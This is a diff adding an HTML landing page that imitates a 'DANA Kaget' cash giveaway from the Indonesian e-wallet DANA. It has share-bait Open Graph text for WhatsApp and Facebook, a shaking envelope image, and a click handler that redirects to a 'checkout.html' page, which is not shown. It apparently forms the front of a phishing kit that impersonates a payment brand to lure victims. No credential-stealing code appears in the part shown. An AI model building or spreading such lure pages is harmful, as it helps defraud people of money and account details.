@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>DANA - Dompet Digital Indonesia</title>
+    
+    <!-- ✅ Open Graph Meta Tags for WhatsApp/Facebook -->
+    <meta property="og:title" content="Aku lagi sebar DANA Kaget nih! Yuk, sikat segera sebelum melayang 🧧🧧🧧" />
+    <meta property="og:description" content="Dana adalah bentuk baru uang tunai yang lebih baik. Transaksi lebih mudah dan cepat." />
+    <meta property="og:image" content="https://pedomanrakyat.co.id/wp-content/uploads/2025/03/Klaim-Link-Saldo-DANA-Kaget-Hingga-Rp140.000-Hari-Ini-696x392.jpg" />
+    <meta property="og:type" content="website" />
+
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      height: 100vh;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    .header {
+      padding: 20px;
+      font-size: 18px;
+      color: white;
+      text-align: left;
+    }
+
+    .instruction {
+      color: white;
+      font-size: 16px;
+    }
+
+    .envelope-container {
+      margin-top: 40px;
+      animation: shake 1s infinite;
+      cursor: pointer;
+    }
+
+    .envelope {
+      width: 220px;
+      height: auto;
+    }
+
+    @keyframes shake {
+      0% { transform: rotate(0deg); }
+      25% { transform: rotate(2deg); }
+      50% { transform: rotate(-2deg); }
+      75% { transform: rotate(2deg); }
+      100% { transform: rotate(0deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">DANA Kaget</div>
+  <div class="instruction">Tap amplop buat</div>
+  <div class="instruction">liat DANA Kaget</div>
+  <div class="envelope-container" id="envelopeContainer">
+    <img src="amplop-dana.png" alt="Amplop DANA" class="envelope" id="envelope" />
+  </div>
+
+  <script>
+    const container = document.getElementById('envelopeContainer');
+    container.addEventListener('click', () => {
+      window.location.href = 'checkout.html';
+    });
+  </script>
+</body>
+</html>
